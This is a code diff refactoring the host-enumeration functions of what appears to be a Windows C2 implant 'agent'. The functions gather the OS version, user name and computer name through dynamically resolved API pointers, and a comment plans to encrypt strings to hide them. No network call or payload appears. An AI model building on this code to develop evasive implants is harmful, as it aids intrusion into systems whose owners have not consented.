@@ -5,22 +5,19 @@
 BOOL Enumerate(pAgent agent)
 {
 	//TODO: this may be an issue since we're not allocating memory manually & copying it into buffer.
-	agent->OperatingSystem = GetOperatingSystemFunc();
-	agent->UserName = GetUser();
-	agent->ComputerName = GetCompName();
+	agent->OperatingSystem = GetOperatingSystemFunc(agent);
+	agent->UserName = GetUser(agent);
+	agent->ComputerName = GetCompName(agent);
 	return TRUE;
 }
 
 //TODO replacee all strings with encoded / encrypted content.
-LPSTR GetOperatingSystemFunc() {
+LPSTR GetOperatingSystemFunc(pAgent agent) {
 	LPCSTR OS = NULL;
-	
-	t_RtlGetVersion pRtlGetVersion = GetProcAddress(GetModuleHandleA("Ntdll.dll"), "RtlGetVersion");
-
 	RTL_OSVERSIONINFOEXW lpVersionInformation = { 0 };
 	lpVersionInformation.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOEXW);
 	NTSTATUS status = 0;
-	status = pRtlGetVersion(&lpVersionInformation);
+	status = agent->pRtlGetVersion(&lpVersionInformation);
 	if (status != NTSUCCESS) {
 		printf("[error] attempting to retrieve the operating system versions. [%08X]", status);
 		return OS;
@@ -105,7 +102,7 @@ LPSTR GetOperatingSystemFunc() {
 		switch (lpVersionInformation.dwMinorVersion)
 		{
 		case 2:
-			if (GetSystemMetrics(SM_SERVERR2) != 0)
+			if (agent->pGetSystemMetrics(SM_SERVERR2) != 0)
 			{
 				OS = "Windows Server 2003 R2";
 				break;
@@ -115,7 +112,7 @@ LPSTR GetOperatingSystemFunc() {
 				OS = "Windows Home Server";
 				break;
 			}
-			else if (GetSystemMetrics(SM_SERVERR2) == 0)
+			else if (agent->pGetSystemMetrics(SM_SERVERR2) == 0)
 			{
 				OS = "Windows Server 2003";
 				break;
@@ -143,14 +140,12 @@ LPSTR GetOperatingSystemFunc() {
 }
 
 
-LPSTR GetUser() {
+LPSTR GetUser(pAgent agent) {
 	PVOID            Data = NULL;
 	DWORD            dwLength = UNLEN + 1;
-	LoadLibrary(L"Advapi32.dll");
-	t_GetUserNameA pGetUserNameA = GetProcAddress(GetModuleHandleA("Advapi32.dll"), "GetUserNameA");
 
 	if (Data = LocalAlloc(LPTR, dwLength)) {
-		pGetUserNameA(Data, &dwLength);
+		agent->pGetUserNameA(Data, &dwLength);
 	}
 	
 	return Data;
@@ -158,16 +153,16 @@ LPSTR GetUser() {
 
 
 //TODO replace this with a function that obtians comptuer name from registry or from env variables.
-LPSTR GetCompName() {
+LPSTR GetCompName(pAgent agent) {
 	PVOID            Data = NULL;
 	SIZE_T           Length = 0;
 	DWORD            dwLength = 0;
-	t_GetComputerNameExA pGetComputerNameExA = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "GetComputerNameExA");
-	if (!pGetComputerNameExA(ComputerNameNetBIOS, NULL, &dwLength))
+
+	if (!agent->pGetComputerNameExA(ComputerNameNetBIOS, NULL, &dwLength))
 	{
 		if ((Data = LocalAlloc(LPTR, dwLength)))
 		{
-			if (pGetComputerNameExA(ComputerNameNetBIOS, Data, &dwLength))
+			if (agent->pGetComputerNameExA(ComputerNameNetBIOS, Data, &dwLength))
 			{
 				return Data; // this may return nothing. if having issues pass a buffer to copy the memory to.
 				//returning this way actually will give us two locations where our computer name will exist. In the heap & in the buffer location in our agent.
